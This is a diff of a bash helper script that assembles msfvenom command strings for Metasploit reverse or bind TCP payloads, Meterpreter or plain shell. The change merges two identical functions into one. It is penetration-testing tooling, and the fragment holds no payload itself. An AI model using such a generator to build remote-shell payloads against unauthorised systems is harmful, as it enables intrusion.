@@ -334,23 +334,19 @@ read filename
 payload=""
 msfgen=""
 
-use_meterpreter() {
+generate_string() {
 	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f $format ${off_bad_char} ${enc_format} ${iteration}"
-}
-
-no_meterpreter() {
-        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f $format ${off_bad_char} ${enc_format} ${iteration}"
 }
 
 case  $meterpreter  in
 	y)
 	payload="${OS}${arc}/meterpreter"
-	use_meterpreter
+	generate_string
 	echo "${grn}You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	n)
 	payload="${OS}${arc}/shell"
-	no_meterpreter
+	generate_string
 	echo "${grn}You will be creating a $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	*)
